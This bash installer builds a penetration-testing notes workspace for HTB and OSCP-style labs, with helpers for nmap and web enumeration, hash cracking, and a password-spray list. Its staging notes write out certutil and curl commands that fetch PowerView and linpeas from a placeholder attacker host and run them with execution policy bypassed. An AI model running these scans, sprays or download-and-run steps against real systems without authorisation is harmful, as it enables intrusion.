#!/usr/bin/env bash
# htb_oscp_cpts_journal_aio.sh (reviewed/fixed)
# Fixes:
# - heredoc delimiter collisions (critical)
# - port matching false positives (80 vs 8080, etc)
# - ffuf -e extensions formatting
# - safer bin script updates (backup + overwrite)

set -euo pipefail

ROOT="${HOME}/pentest-journal"
TEMPLATE="${ROOT}/template"
BOXES="${ROOT}/boxes"
BIN="${ROOT}/bin"
CFG="${ROOT}/config"
WLISTS="${ROOT}/wordlists"

# Overwrite bin helpers by default (prevents stale broken helpers after partial installs)
FORCE_BIN="${FORCE_BIN:-1}"

umask 022

say()  { printf "\033[1;32m[+]\033[0m %s\n" "$*"; }
warn() { printf "\033[1;33m[!]\033[0m %s\n" "$*"; }
die()  { printf "\033[1;31m[x]\033[0m %s\n" "$*"; exit 1; }

have() { command -v "$1" >/dev/null 2>&1; }
ensure_dir() { mkdir -p "$1"; }

backup_if_exists() {
  local f="$1"
  [[ -f "$f" ]] || return 0
  cp -a "$f" "${f}.bak_$(date +%Y%m%d_%H%M%S)" 2>/dev/null || true
}

append_if_missing() {
  local file="$1"
  local marker="$2"
  local content="$3"
  ensure_dir "$(dirname "$file")"
  touch "$file"
  if ! grep -qF "$marker" "$file"; then
    printf "\n%s\n" "$content" >> "$file"
  fi
}

should_write_bin() {
  local f="$1"
  [[ "${FORCE_BIN}" == "1" ]] && return 0
  [[ ! -f "$f" ]]
}

# --- Folders (self-healing) ---
say "Creating folders under ${ROOT}"
ensure_dir "${TEMPLATE}" "${BOXES}" "${BIN}" "${CFG}" "${WLISTS}"

# Template modules
for d in \
  00_admin 01_scans 02_enum 03_web 04_ad 05_privesc 06_loot/files \
  07_notes 08_scripts 09_evidence/screenshots 09_evidence/proofs \
  10_staging/ps 10_staging/linux; do
  ensure_dir "${TEMPLATE}/${d}"
done

# --- Default config ---
# NOTE: Only creates if missing. If you already have it, edit it manually.
if [[ ! -f "${CFG}/default.conf" ]]; then
  say "Writing ${CFG}/default.conf"
  cat > "${CFG}/default.conf" <<'DEFAULTCONF'
# default.conf (HTB/CPTS/OSCP tuned)

# ---- Scanning ----
NMAP_FAST_PORTS="21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,465,587,593,636,993,995,1433,1521,2049,3306,3389,5432,5985,5986,6379,8000,8080,8443,9000,9090,9200,27017"
NMAP_TIMING="-T4"
NMAP_EXTRA_ARGS="-Pn"
NMAP_FAST_MINRATE="1500"
NMAP_FULL_MINRATE="2000"

NMAP_DEFAULT_SCRIPTS="-sC -sV"
NMAP_SAFE_SCRIPTS="--script safe"
NMAP_VULN_SCRIPTS="--script vuln"

UDP_TOP_PORTS="53,67,68,69,123,161,162,500,514,1900,5353"
RUN_UDP="0"

# ---- Web enum ----
RUN_FFUF="1"
FFUF_WORDLIST="/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
# ffuf expects comma-separated extensions with leading dots
FFUF_EXT=".php,.asp,.aspx,.jsp,.txt,.html,.js,.json,.xml,.bak,.old,.zip,.tar,.tar.gz"
FFUF_TIMEOUT="120"

RUN_FEROX="1"
FEROX_OPTS="-k -C 404 -x php,asp,aspx,jsp,txt,html,js,json,xml,bak,old -t 30 -d 2"

RUN_GOBUSTER="0"
GOBUSTER_WORDLIST="/usr/share/wordlists/dirb/common.txt"
GOBUSTER_EXT="php,txt,html,asp,aspx,jsp"
GOBUSTER_TIMEOUT="120"

RUN_WPSCAN="1"
WPSCAN_OPTS="--enumerate u,ap,at,tt,cb,dbe"

# ---- AD/Kerberos ----
DOMAIN=""
DC_IP=""
DNS_IP=""

# ---- Spraying / brute ----
ENABLE_SPRAY="0"
SPRAY_USERS_FILE=""
SPRAY_PASSWORDS_FILE=""
SPRAY_SUBNET=""

# ---- Wordlists pack ----
WLIST_ROOT="${HOME}/pentest-journal/wordlists"
WLIST_ROCKYOU="/usr/share/wordlists/rockyou.txt"
WLIST_XATO_10K="${HOME}/pentest-journal/wordlists/passwords/xato-net-10-million-passwords-10000.txt"
WLIST_SEASONS="${HOME}/pentest-journal/wordlists/passwords/seasons.txt"
WLIST_MONTHS="${HOME}/pentest-journal/wordlists/passwords/months.txt"
WLIST_COMBO="${HOME}/pentest-journal/wordlists/passwords/seasons_months_short.txt"

CRACK_TOOL="john"   # john | hashcat
DEFAULTCONF
fi

# --- Template files (create-only; do not overwrite) ---
if [[ ! -f "${TEMPLATE}/00_admin/README.md" ]]; then
  cat > "${TEMPLATE}/00_admin/README.md" <<'ADMINREADME'
# Admin (HTB / CPTS / OSCP tuned)

## Scope / LOE
- Subnet/Targets:
- Constraints:
- Notes (reverts/resets, flaky services):

## Workflow
- FAST scan → targeted scan → optional FULL -p-
- Evidence-first: commands + outputs + screenshots
ADMINREADME
fi

if [[ ! -f "${TEMPLATE}/06_loot/loot.md" ]]; then
  cat > "${TEMPLATE}/06_loot/loot.md" <<'LOOT'
# Loot (Single Source of Truth)

## Flags / Proofs
| Type | Host | Path | Captured? | Notes |
|------|------|------|----------|------|
| HTB user.txt |  |  |  |  |
| HTB root.txt |  |  |  |  |
| OSCP local.txt |  |  |  |  |
| OSCP proof.txt |  |  |  |  |

## Credentials
| Where | User | Secret | Type | Verified On | Notes |
|------|------|--------|------|-------------|------|

## Hashes / Tickets
| Where | Identity | Hash/Ticket | Format | Cracked? | Notes |
|------|----------|-------------|--------|----------|------|
LOOT
fi

if [[ ! -f "${TEMPLATE}/07_notes/box-notes.md" ]]; then
  cat > "${TEMPLATE}/07_notes/box-notes.md" <<'BOXNOTES'
# Box Notes

## Box
- Name:
- Date:
- Targets:

## Timeline
- T0 Discovery:
- T1 Foothold:
- T2 PrivEsc:
- T3 Objective:

## Final Path Summary
- Entry → PrivEsc → Proof/Flags
BOXNOTES
fi

if [[ ! -f "${TEMPLATE}/07_notes/instability-log.md" ]]; then
  cat > "${TEMPLATE}/07_notes/instability-log.md" <<'INSTAB'
# Instability Log

- Timestamp:
- Host/IP:
- Symptom:
- Tried:
- Outcome:
INSTAB
fi

if [[ ! -f "${TEMPLATE}/10_staging/ps/README.md" ]]; then
  cat > "${TEMPLATE}/10_staging/ps/README.md" <<'PSSTAGE'
# PowerShell Staging
python3 -m http.server 8000
certutil -urlcache -split -f http://ATTACKER:8000/PowerView.ps1 C:\Windows\Temp\PowerView.ps1
powershell -ep bypass -f C:\Windows\Temp\PowerView.ps1
PSSTAGE
fi

if [[ ! -f "${TEMPLATE}/10_staging/linux/README.md" ]]; then
  cat > "${TEMPLATE}/10_staging/linux/README.md" <<'LINSTAGE'
# Linux Staging
python3 -m http.server 8001
curl -fsSL http://ATTACKER:8001/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
LINSTAGE
fi

# --- Wordlists layout ---
ensure_dir "${WLISTS}/passwords" "${WLISTS}/users" "${WLISTS}/rules" "${WLISTS}/custom"

# --- mkcombo ---
if should_write_bin "${BIN}/mkcombo"; then
  say "Writing ${BIN}/mkcombo"
  backup_if_exists "${BIN}/mkcombo"
  cat > "${BIN}/mkcombo" <<'MKCOMBO'
#!/usr/bin/env bash
set -euo pipefail
ROOT="${HOME}/pentest-journal/wordlists/passwords"
OUT="${HOME}/pentest-journal/wordlists/passwords/seasons_months_short.txt"

: > "$OUT"
for f in seasons.txt months.txt; do
  [[ -f "${ROOT}/${f}" ]] && cat "${ROOT}/${f}" >> "$OUT"
done

cat >> "$OUT" <<'EOV'
Winter2024!
Winter2025!
Winter2026!
Spring2024!
Spring2025!
Spring2026!
Summer2024!
Summer2025!
Summer2026!
Autumn2024!
Autumn2025!
Autumn2026!
Password123!
Welcome1!
Welcome123!
Admin123!
P@ssw0rd!
EOV

echo "[+] Wrote $OUT"
MKCOMBO
  chmod +x "${BIN}/mkcombo"
fi

# --- sync_wordlists ---
if should_write_bin "${BIN}/sync_wordlists"; then
  say "Writing ${BIN}/sync_wordlists"
  backup_if_exists "${BIN}/sync_wordlists"
  cat > "${BIN}/sync_wordlists" <<'SYNCW'
#!/usr/bin/env bash
set -euo pipefail

DEST="${HOME}/pentest-journal/wordlists/passwords"
mkdir -p "${DEST}"

targets=(
  "xato-net-10-million-passwords-10000.txt"
  "seasons.txt"
  "months.txt"
)

search_roots=(
  "${HOME}"
  "${HOME}/Desktop"
  "${HOME}/Documents"
  "${HOME}/Downloads"
  "/usr/share/wordlists"
  "/usr/share/seclists"
)

found_any=0
for t in "${targets[@]}"; do
  [[ -f "${DEST}/${t}" ]] && { echo "[=] Already have ${t}"; continue; }
  found=""
  for r in "${search_roots[@]}"; do
    [[ -d "$r" ]] || continue
    match="$(find "$r" -maxdepth 7 -type f -name "$t" 2>/dev/null | head -n 1 || true)"
    if [[ -n "$match" ]]; then found="$match"; break; fi
  done
  if [[ -n "$found" ]]; then
    cp -n "$found" "${DEST}/${t}"
    echo "[+] Synced ${t} from: ${found}"
    found_any=1
  else
    echo "[!] Not found: ${t} (place into ${DEST}/ manually if needed)"
  fi
done

if [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
  echo "[=] rockyou.txt present at /usr/share/wordlists/rockyou.txt"
elif [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
  echo "[!] rockyou.txt.gz found. You may need: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz"
else
  echo "[!] rockyou not found in /usr/share/wordlists"
fi

[[ "$found_any" -eq 1 ]] && echo "[+] Done. Run: mkcombo" || echo "[!] Nothing synced."
SYNCW
  chmod +x "${BIN}/sync_wordlists"
fi

# --- crack helper ---
if should_write_bin "${BIN}/crack"; then
  say "Writing ${BIN}/crack"
  backup_if_exists "${BIN}/crack"
  cat > "${BIN}/crack" <<'CRACK'
#!/usr/bin/env bash
set -euo pipefail

usage() {
  cat <<'USAGE'
Usage:
  crack --tool john --hashfile <file> --wordlist <wl>
  crack --tool hashcat --mode <id> --hashfile <file> --wordlist <wl> [--rules <rulesfile>
USAGE
}

TOOL=""; MODE=""; HASHFILE=""; WORDLIST=""; RULES=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --tool) TOOL="$2"; shift 2;;
    --mode) MODE="$2"; shift 2;;
    --hashfile) HASHFILE="$2"; shift 2;;
    --wordlist) WORDLIST="$2"; shift 2;;
    --rules) RULES="$2"; shift 2;;
    -h|--help) usage; exit 0;;
    *) echo "[!] Unknown: $1"; usage; exit 1;;
  esac
done

[[ -z "$TOOL" || -z "$HASHFILE" || -z "$WORDLIST" ]] && usage && exit 1
[[ -f "$HASHFILE" ]] || { echo "[x] Missing hashfile: $HASHFILE"; exit 1; }
[[ -f "$WORDLIST" ]] || { echo "[x] Missing wordlist: $WORDLIST"; exit 1; }

if [[ "$TOOL" == "john" ]]; then
  command -v john >/dev/null 2>&1 || { echo "[x] john not found"; exit 1; }
  john --wordlist="$WORDLIST" "$HASHFILE" || true
  john --show "$HASHFILE" || true
elif [[ "$TOOL" == "hashcat" ]]; then
  command -v hashcat >/dev/null 2>&1 || { echo "[x] hashcat not found"; exit 1; }
  [[ -n "$MODE" ]] || { echo "[x] --mode required for hashcat"; exit 1; }
  if [[ -n "$RULES" && -f "$RULES" ]]; then
    hashcat -m "$MODE" "$HASHFILE" "$WORDLIST" -r "$RULES" --force || true
  else
    hashcat -m "$MODE" "$HASHFILE" "$WORDLIST" --force || true
  fi
  hashcat -m "$MODE" "$HASHFILE" --show || true
else
  echo "[x] Unknown tool: $TOOL"
  exit 1
fi
CRACK
  chmod +x "${BIN}/crack"
fi

# --- stage helper ---
if should_write_bin "${BIN}/stage"; then
  say "Writing ${BIN}/stage"
  backup_if_exists "${BIN}/stage"
  cat > "${BIN}/stage" <<'STAGE'
#!/usr/bin/env bash
set -euo pipefail

usage() {
  cat <<'USAGE'
Usage:
  stage --box <BoxName> --attacker <ATTACKER_IP> [--psport 8000] [--linport 8001]
USAGE
}

BOX=""; ATT=""; PSPORT="8000"; LINPORT="8001"
while [[ $# -gt 0 ]]; do
  case "$1" in
    --box) BOX="$2"; shift 2;;
    --attacker) ATT="$2"; shift 2;;
    --psport) PSPORT="$2"; shift 2;;
    --linport) LINPORT="$2"; shift 2;;
    -h|--help) usage; exit 0;;
    *) shift;;
  esac
done
[[ -z "$BOX" || -z "$ATT" ]] && usage && exit 1

ROOT="${HOME}/pentest-journal"
BOXDIR="${ROOT}/boxes/${BOX}"
PSDIR="${BOXDIR}/10_staging/ps"
LINDIR="${BOXDIR}/10_staging/linux"
mkdir -p "$PSDIR" "$LINDIR"

echo "[+] PS staging:   $PSDIR"
echo "    Serve: cd \"$PSDIR\" && python3 -m http.server $PSPORT"
echo "    certutil -urlcache -split -f http://${ATT}:${PSPORT}/PowerView.ps1 C:\\Windows\\Temp\\PowerView.ps1"
echo
echo "[+] Linux staging: $LINDIR"
echo "    Serve: cd \"$LINDIR\" && python3 -m http.server $LINPORT"
echo "    curl -fsSL http://${ATT}:${LINPORT}/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
STAGE
  chmod +x "${BIN}/stage"
fi

# --- makebox (CRITICAL: unique delimiters to avoid installer heredoc collision) ---
if should_write_bin "${BIN}/makebox"; then
  say "Writing ${BIN}/makebox"
  backup_if_exists "${BIN}/makebox"
  cat > "${BIN}/makebox" <<'MAKEBOX_SCRIPT'
#!/usr/bin/env bash
set -euo pipefail

ROOT="${HOME}/pentest-journal"
TEMPLATE="${ROOT}/template"
BOXES="${ROOT}/boxes"

usage() {
  cat <<'USAGE'
Usage:
  makebox <Name> <target_ip_or_subnet> [domain] [dc_ip]
USAGE
}

[[ $# -lt 2 ]] && usage && exit 1

BOX="$1"
TARGET="$2"
DOMAIN="${3:-}"
DC_IP="${4:-}"

DEST="${BOXES}/${BOX}"
mkdir -p "${BOXES}"

if [[ -d "${DEST}" ]]; then
  echo "[!] ${DEST} exists. Self-healing: ensuring folders/files exist."
else
  cp -r "${TEMPLATE}" "${DEST}"
fi

for d in \
  00_admin 01_scans 02_enum 03_web 04_ad 05_privesc 06_loot/files \
  07_notes 08_scripts 09_evidence/screenshots 09_evidence/proofs \
  10_staging/ps 10_staging/linux hosts; do
  mkdir -p "${DEST}/${d}"
done

BOXCONF="${DEST}/box.conf"
if [[ ! -f "${BOXCONF}" ]]; then
  cat > "${BOXCONF}" <<'BOXCONF_EOF'
# box.conf (per-box overrides)
TARGET="__TARGET__"

# AD (optional)
DOMAIN="__DOMAIN__"
DC_IP="__DCIP__"
DNS_IP="__DCIP__"

ENABLE_SPRAY="0"
SPRAY_USERS_FILE="__DEST__/04_ad/users.txt"
SPRAY_PASSWORDS_FILE="__ROOT__/wordlists/passwords/seasons_months_short.txt"
SPRAY_SUBNET="__TARGET__"
BOXCONF_EOF

  # substitute placeholders safely
  sed -i "s|__TARGET__|${TARGET}|g" "${BOXCONF}"
  sed -i "s|__DOMAIN__|${DOMAIN}|g" "${BOXCONF}"
  sed -i "s|__DCIP__|${DC_IP}|g" "${BOXCONF}"
  sed -i "s|__DEST__|${DEST}|g" "${BOXCONF}"
  sed -i "s|__ROOT__|${ROOT}|g" "${BOXCONF}"
fi

sed -i "s/- Name:$/- Name: ${BOX}/" "${DEST}/07_notes/box-notes.md" 2>/dev/null || true

if [[ "${TARGET}" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  mkdir -p "${DEST}/hosts/${TARGET}/"{scans,enum,loot,notes,web,ad}
fi

echo "[+] Ready: ${DEST}"
echo "    - Edit: ${BOXCONF}"
echo "    - Run:  enum --box \"${BOX}\""
MAKEBOX_SCRIPT
  chmod +x "${BIN}/makebox"
fi

# --- enum (fix port matching + ffuf ext) ---
if should_write_bin "${BIN}/enum"; then
  say "Writing ${BIN}/enum"
  backup_if_exists "${BIN}/enum"
  cat > "${BIN}/enum" <<'ENUM_SCRIPT'
#!/usr/bin/env bash
set -euo pipefail

ROOT="${HOME}/pentest-journal"
CFG_DEFAULT="${ROOT}/config/default.conf"

have() { command -v "$1" >/dev/null 2>&1; }
ts() { date +"%Y%m%d_%H%M%S"; }
say() { printf "\033[1;34m[enum]\033[0m %s\n" "$*"; }
warn(){ printf "\033[1;33m[enum]\033[0m %s\n" "$*"; }

usage() {
  cat <<'USAGE'
Usage:
  enum --box <Name> [--target <ip|subnet>] [--domain DOMAIN.LOCAL] [--dc <dc_ip>] [--full] [--vuln] [--udp]
USAGE
}

BOX=""; TARGET=""; DOMAIN=""; DC_IP=""
DO_FULL="0"; DO_VULN="0"; DO_UDP="0"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --box) BOX="$2"; shift 2;;
    --target) TARGET="$2"; shift 2;;
    --domain) DOMAIN="$2"; shift 2;;
    --dc) DC_IP="$2"; shift 2;;
    --full) DO_FULL="1"; shift;;
    --vuln) DO_VULN="1"; shift;;
    --udp) DO_UDP="1"; shift;;
    -h|--help) usage; exit 0;;
    *) warn "Unknown arg: $1"; usage; exit 1;;
  esac
done

[[ -z "${BOX}" ]] && usage && exit 1
BOXDIR="${ROOT}/boxes/${BOX}"
[[ ! -d "${BOXDIR}" ]] && { warn "Box dir not found: ${BOXDIR}. Run: makebox ${BOX} <target>"; exit 1; }

# shellcheck disable=SC1090
source "${CFG_DEFAULT}"
[[ -f "${BOXDIR}/box.conf" ]] && source "${BOXDIR}/box.conf" # shellcheck disable=SC1090

[[ -n "${TARGET}" ]] && TARGET="${TARGET}"
[[ -n "${DOMAIN}" ]] && DOMAIN="${DOMAIN}"
[[ -n "${DC_IP}" ]] && DC_IP="${DC_IP}" && DNS_IP="${DC_IP}"

[[ -z "${TARGET:-}" ]] && { warn "No target set. Provide --target or set TARGET in ${BOXDIR}/box.conf"; exit 1; }

RUNLOG="${BOXDIR}/07_notes/enum_runs.log"
mkdir -p "${BOXDIR}/07_notes"
touch "${RUNLOG}"
echo "=== Run $(ts) target=${TARGET} full=${DO_FULL} vuln=${DO_VULN} udp=${DO_UDP} domain=${DOMAIN:-} dc=${DC_IP:-} ===" >> "${RUNLOG}"

parse_ports_from_gnmap() {
  local gn="$1"
  [[ -f "$gn" ]] || return 0
  grep -Eo "[0-9]+/open/tcp" "$gn" | cut -d/ -f1 | sort -n | uniq | paste -sd, -
}

scan_host() {
  local ip="$1"
  local hostdir="${BOXDIR}/hosts/${ip}"
  mkdir -p "${hostdir}"/{scans,enum,web,ad,loot,notes}

  say "FAST scan ${ip} (ports: ${NMAP_FAST_PORTS})"
  local fastbase="${hostdir}/scans/${ip}_fast_${ts}"
  nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} --min-rate "${NMAP_FAST_MINRATE:-1500}" \
    -p "${NMAP_FAST_PORTS}" --open ${NMAP_DEFAULT_SCRIPTS:-} "${ip}" -oA "${fastbase}" >/dev/null 2>&1 || true

  local open_ports
  open_ports="$(parse_ports_from_gnmap "${fastbase}.gnmap")"
  echo "[*] ${ip} FAST open tcp ports: ${open_ports}" | tee -a "${RUNLOG}" >/dev/null

  local full_ports=""
  if [[ "${DO_FULL}" == "1" ]]; then
    say "FULL scan ${ip} (-p-)"
    local fullbase="${hostdir}/scans/${ip}_full_${ts}"
    nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} --min-rate "${NMAP_FULL_MINRATE:-2000}" \
      -p- --open -sS "${ip}" -oA "${fullbase}" >/dev/null 2>&1 || true
    full_ports="$(parse_ports_from_gnmap "${fullbase}.gnmap")"
    echo "[*] ${ip} FULL open tcp ports: ${full_ports}" | tee -a "${RUNLOG}" >/dev/null
  fi

  local merged_ports="${open_ports}"
  if [[ -n "${full_ports}" ]]; then
    merged_ports="$(printf "%s\n" "${open_ports},${full_ports}" | tr ',' '\n' | sort -n | uniq | paste -sd, -)"
  fi

  if [[ -z "${merged_ports}" ]]; then
    warn "No open TCP ports detected for ${ip}."
    return 0
  fi

  say "TARGETED service scan ${ip} (ports: ${merged_ports})"
  local servbase="${hostdir}/scans/${ip}_services_${ts}"
  nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${merged_ports}" -sC -sV "${ip}" -oA "${servbase}" >/dev/null 2>&1 || true

  if [[ "${DO_VULN}" == "1" ]]; then
    say "VULN scripts ${ip} (timeboxed)"
    local vulnbase="${hostdir}/scans/${ip}_vuln_${ts}"
    timeout 300 nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${merged_ports}" ${NMAP_VULN_SCRIPTS:-} "${ip}" -oA "${vulnbase}" >/dev/null 2>&1 || true
  fi

  if [[ "${DO_UDP}" == "1" || "${RUN_UDP:-0}" == "1" ]]; then
    say "UDP light scan ${ip} (ports: ${UDP_TOP_PORTS})"
    local udpbase="${hostdir}/scans/${ip}_udp_${ts}"
    timeout 300 nmap -sU ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${UDP_TOP_PORTS}" --open "${ip}" -oA "${udpbase}" >/dev/null 2>&1 || true
  fi

  local ports_line
  ports_line="$(grep -Eo "Ports: .*" "${servbase}.gnmap" 2>/dev/null | head -n1 | sed 's/Ports: //')"

  # Robust port checks: match " 80/open/" or ", 80/open/"
  port_open() { echo "${ports_line}" | grep -qE "(^|, )[[:space:]]*${1}/open/"; }

  # SMB
  if port_open 445 || port_open 139; then
    say "SMB enum ${ip}"
    have smbclient && timeout 30 smbclient -L "//${ip}" -N > "${hostdir}/enum/smb_shares_null.txt" 2>&1 || true
    have rpcclient && timeout 30 rpcclient -U "" -N "${ip}" -c "srvinfo; enumdomusers; querydominfo" > "${hostdir}/enum/rpc_null.txt" 2>&1 || true
  fi

  # Web ports
  for p in 80 443 8080 8443 8000; do
    if port_open "$p"; then
      local proto="http"
      [[ "$p" == "443" || "$p" == "8443" ]] && proto="https"
      local url="${proto}://${ip}:${p}"
      [[ "$p" == "80" ]] && url="http://${ip}"
      [[ "$p" == "443" ]] && url="https://${ip}"

      say "Web enum ${url}"
      curl -ksI "${url}" -m 10 > "${hostdir}/web/headers_${p}.txt" 2>/dev/null || true
      curl -ksL "${url}/" -m 12 > "${hostdir}/web/home_${p}.html" 2>/dev/null || true
      have whatweb && whatweb "${url}" > "${hostdir}/web/whatweb_${p}.txt" 2>&1 || true

      # ffuf wordlist fallback if seclists path missing
      local wl="${FFUF_WORDLIST}"
      [[ -f "$wl" ]] || wl="/usr/share/wordlists/dirb/common.txt"

      if [[ "${RUN_FFUF:-0}" == "1" ]] && have ffuf; then
        timeout "${FFUF_TIMEOUT:-120}" ffuf -w "${wl}" -u "${url}/FUZZ" -e "${FFUF_EXT}" -ac -t 40 \
          > "${hostdir}/web/ffuf_${p}.txt" 2>&1 || true
      elif [[ "${RUN_FEROX:-0}" == "1" ]] && have feroxbuster; then
        timeout "${FFUF_TIMEOUT:-120}" feroxbuster -u "${url}" ${FEROX_OPTS:-} \
          > "${hostdir}/web/ferox_${p}.txt" 2>&1 || true
      fi

      if [[ "${RUN_WPSCAN:-0}" == "1" ]] && have wpscan; then
        if grep -qi "wp-content\|wordpress" "${hostdir}/web/home_${p}.html" 2>/dev/null; then
          wpscan --url "${url}" ${WPSCAN_OPTS:-} > "${hostdir}/web/wpscan_${p}.txt" 2>&1 || true
        fi
      fi
    fi
  done
}

if [[ "${TARGET}" == */* ]]; then
  say "Subnet mode discovery: ${TARGET}"
  disc="${BOXDIR}/01_scans/discovery_$(ts)"
  nmap -sn "${TARGET}" -oA "${disc}" >/dev/null 2>&1 || true

  ips=()
  if [[ -f "${disc}.gnmap" ]]; then
    while read -r line; do
      ips+=("$(echo "$line" | awk '{print $2}')")
    done < <(grep "Up" "${disc}.gnmap" || true)
  fi

  if [[ ${#ips[@]} -eq 0 ]]; then
    warn "No live hosts found via ICMP. Try TCP discovery:"
    warn "  nmap -Pn -p ${NMAP_FAST_PORTS} --open ${TARGET} -oA ${BOXDIR}/01_scans/tcp_discovery"
    exit 0
  fi

  for ip in "${ips[@]}"; do scan_host "$ip"; done
else
  scan_host "${TARGET}"
fi

say "Done. Review: ${BOXDIR}/hosts/<ip>/*"
ENUM_SCRIPT
  chmod +x "${BIN}/enum"
fi

# --- PATH + aliases ---
SNIP="${ROOT}/.shellrc_snippet"
cat > "${SNIP}" <<EOF
# pentest-journal helpers (HTB/CPTS/OSCP tuned)
export PATH="\$PATH:${BIN}"
alias makebox='makebox'
alias enum='enum'
alias mkcombo='mkcombo'
alias sync_wordlists='sync_wordlists'
alias crack='crack'
alias stage='stage'
EOF

BASHRC="${HOME}/.bashrc"
append_if_missing "${BASHRC}" "# pentest-journal helpers (HTB/CPTS/OSCP tuned)" "source \"${SNIP}\" 2>/dev/null # pentest-journal helpers (HTB/CPTS/OSCP tuned)"

say "Installed."
say "Next steps:"
echo "  source ~/.bashrc"
echo "  makebox Resolute 10.129.96.155"
echo "  enum --box Resolute --full"
warn "Bin helpers overwrite is ON by default (FORCE_BIN=1). Set FORCE_BIN=0 to preserve existing."
